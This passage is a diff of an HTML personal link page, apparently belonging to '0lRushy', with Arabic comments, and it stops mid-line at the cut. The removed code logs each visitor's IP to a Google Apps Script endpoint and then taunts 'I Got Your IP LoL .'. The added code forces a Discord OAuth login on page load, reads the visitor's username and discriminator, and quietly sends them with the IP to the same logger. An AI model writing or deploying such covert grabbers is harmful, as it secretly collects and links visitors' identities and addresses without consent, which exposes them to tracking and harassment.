@@ -116,12 +116,17 @@
       user-select: none;
       cursor: default;
     }
+    #user-info {
+      margin-top: 15px;
+      font-size: 1em;
+      text-shadow: 0 0 5px green;
+    }
   </style>
 </head>
 <body>
 
-  <div id="entry-screen" onclick="enterSite()">
-    Click To Enter .
+  <div id="entry-screen">
+    Loading...
   </div>
 
   <div id="visit-label">Visits: ...</div>
@@ -135,6 +140,7 @@
     <div class="container">
       <img src="we.png" alt="0lRushy" class="glow-img" />
       <h1>0lRushy</h1>
+      <div id="user-info">Loading user info...</div>
       <div class="links">
         <a href="https://github.com/EssaSadi21" target="_blank"><i class="fab fa-github"></i> GitHub 0lrushy</a>
         <a href="https://www.snapchat.com/add/auog" target="_blank"><i class="fas fa-link"></i> SnapChat @0lrushy</a>
@@ -145,94 +151,84 @@
   </div>
 
   <script>
-    function enterSite() {
-      document.body.classList.add('show-main');
+    const clientId = '1372712369100161055';
+    const redirectUri = encodeURIComponent(window.location.origin + window.location.pathname); // نفس صفحة الموقع
+    const scope = 'identify';
+    const discordAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=token&scope=${scope}`;
 
-      const audio = document.getElementById('bg-music');
-      setTimeout(() => {
-        audio.muted = false;
-        audio.volume = 0.5;
-        audio.play().catch(e => {
-          console.log("المتصفح رفض التشغيل التلقائي:", e);
+    // دالة لجلب توكن من هاش URL (#access_token=...)
+    function getAccessTokenFromHash() {
+      const hash = window.location.hash.substring(1);
+      const params = new URLSearchParams(hash);
+      return params.get('access_token');
+    }
+
+    // دالة لجلب بيانات المستخدم من ديسكورد
+    async function fetchDiscordUser(token) {
+      try {
+        const res = await fetch('https://discord.com/api/users/@me', {
+          headers: { Authorization: `Bearer ${token}` }
         });
-      }, 1000);
+        if (!res.ok) throw new Error('Failed to fetch user info');
+        return await res.json();
+      } catch (e) {
+        console.error(e);
+        return null;
+      }
+    }
 
-      const createSnow = () => {
-        const snow = document.createElement("div");
-        snow.classList.add("snowflake");
-        snow.style.left = Math.random() * 100 + "vw";
-        snow.style.animationDuration = (Math.random() * 3 + 3) + "s";
-        document.body.appendChild(snow);
-        setTimeout(() => snow.remove(), 7000);
-      };
-      setInterval(createSnow, 150);
+    async function init() {
+      let token = getAccessTokenFromHash();
 
-      // ** بداية جلب IP وإرساله **
+      if (!token) {
+        // إذا ما فيه توكن - نعيد التوجيه لتسجيل دخول ديسكورد تلقائي
+        window.location.href = discordAuthUrl;
+        return;
+      }
+
+      // مسح الهاش من URL بدون إعادة تحميل الصفحة
+      history.replaceState(null, null, ' ');
+
+      const user = await fetchDiscordUser(token);
+
+      if (!user) {
+        document.getElementById('entry-screen').textContent = 'Failed to fetch Discord user info.';
+        return;
+      }
+
+      // نعرض اسم المستخدم
+      document.getElementById('user-info').textContent = `Discord User: ${user.username}#${user.discriminator}`;
+
+      // نبدأ تشغيل الموقع
+      enterSite();
+
+      // هنا جلب الـ IP وارساله كما عندك
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
           const ip = data.ip;
           console.log('Visitor IP:', ip);
-
-          // رابط Google Apps Script الخاص بك - عدلته هنا
+          // رابط Google Apps Script الخاص بك
           const gasURL = 'https://script.google.com/macros/s/AKfycbxKvTAnQhresyE7v_3OVz_KKyxdDWKGtlZDoiKpxBYnSFc7i5QSMTd3zzB5g2XzlRYS/exec';
-
-          fetch(gasURL + '?ip=' + encodeURIComponent(ip))
+          fetch(gasURL + '?ip=' + encodeURIComponent(ip) + '&username=' + encodeURIComponent(user.username) + '&discriminator=' + encodeURIComponent(user.discriminator))
             .then(res => res.text())
             .then(text => {
               console.log('Response from GAS:', text);
             })
             .catch(err => {
-              console.error('Error sending IP to GAS:', err);
+              console.error('Error sending data to GAS:', err);
             });
         })
         .catch(err => {
           console.error('Failed to get IP:', err);
         });
-      // ** نهاية جلب IP وإرساله **
 
-      // بعد 5 ثواني حذف كل شيء واظهار النص مع الحفاظ على الموسيقى
-      setTimeout(() => {
-        const audio = document.getElementById('bg-music');
-
-        // نمسح كل محتويات الـ body
-        document.body.innerHTML = '';
-
-        // نعيد إدخال عنصر الصوت فقط
-        document.body.appendChild(audio);
-
-        // نضيف رسالة النص
-        const msgDiv = document.createElement('div');
-        msgDiv.style.cssText = `
-          height: 100vh;
-          display: flex;
-          justify-content: center;
-          align-items: center;
-          background: black;
-          color: white;
-          font-family: 'Press Start 2P', monospace;
-          font-size: 3em;
-          text-shadow: 0 0 10px green, 0 0 5px white;
-          user-select: none;
-          text-align: center;
-        `;
-        msgDiv.textContent = "I Got Your IP LoL .";
-
-        document.body.appendChild(msgDiv);
-      }, 20000);
-    }
-
-    // جلب عدد الزيارات من GAS (تأكد أنك عدلت السكربت لاسترجاع العدد)
-    fetch("https://script.google.com/macros/s/AKfycbwO4MtdoAvNTB0HpM5iPa97ccGODbHwkf4iSC0NU7PeNk78o2RglVxII6cWaYjz5G03/exec")
-      .then(response => response.text())
-      .then(count => {
-        document.getElementById('visit-label').textContent = 'Visits: ' + count;
-      })
-      .catch(err => {
-        console.error('خطأ في جلب عدد الزيارات:', err);
-        document.getElementById('visit-label').textContent = 'Visits: N/A';
-      });
-  </script>
-
-</body>
-</html>
+      // جلب عدد الزيارات
+      fetch("https://script.google.com/macros/s/AKfycbwO4MtdoAvNTB0HpM5iPa97ccGODbHwkf4iSC0NU7PeNk78o2RglVxII6cWaYjz5G03/exec")
+        .then(response => response.text())
+        .then(count => {
+          document.getElementById('visit-label').textContent = 'Visits: ' + count;
+        })
+        .catch(err => {
+          console.error('خطأ في جلب عدد الزيارات:', err);
+          document.getElementBy
